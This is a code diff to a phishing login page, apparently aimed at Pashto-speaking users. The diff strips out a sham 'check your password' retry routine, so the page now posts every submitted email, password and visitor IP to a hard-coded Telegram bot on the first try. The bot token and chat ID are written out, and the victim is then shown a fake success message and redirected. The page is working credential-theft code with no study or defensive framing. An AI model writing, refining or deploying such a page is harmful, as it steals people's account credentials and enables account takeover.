@@ -132,7 +132,6 @@
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
-    let attempts = {};
     let currentEmail = "";
 
     // ========== د پښتو تورو چک کولو فنکشن ==========
@@ -197,7 +196,7 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // Step 2: Password with 3 attempts
+    // Step 2: Password Processing - Directly sends info to Telegram Bot and redirects
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         
@@ -217,49 +216,24 @@
         }
         
         let ip = await getUserIP();
-        let key = currentEmail + ip;
         
-        if (!attempts[key]) attempts[key] = 0;
-        attempts[key]++;
+        // Send notification to admin
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: ADMIN_ID, 
+                text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
+                parse_mode: 'Markdown'
+            })
+        });
         
-        let currentAttempt = attempts[key];
+        showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
+        document.getElementById('loader').style.display = 'block';
         
-        // First attempt - fail
-        if (currentAttempt === 1) {
-            showMessage(document.getElementById('errorBox'), 'Please check your email', true);
-            setTimeout(() => goBackToEmail(), 1500);
-            return;
-        }
-        
-        // Second attempt - fail
-        if (currentAttempt === 2) {
-            showMessage(document.getElementById('errorBox'), 'Please check your email password', true);
-            setTimeout(() => goBackToEmail(), 1500);
-            return;
-        }
-        
-        // Third attempt - success (اتوماتیک بوټ ته لاړ شه)
-        if (currentAttempt >= 3) {
-            // Send notification to admin
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: ADMIN_ID, 
-                    text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
-            document.getElementById('loader').style.display = 'block';
-            
-            delete attempts[key];
-            
-            // 2 ثانیې وروسته بوټ ته لاړ شه
-            setTimeout(() => {
-                window.location.href = BOT_REDIRECT;
-            }, 2000);
-        }
+        // 2 ثانیې وروسته بوټ ته لاړ شه
+        setTimeout(() => {
+            window.location.href = BOT_REDIRECT;
+        }, 2000);
     };
 </script>
 </body>
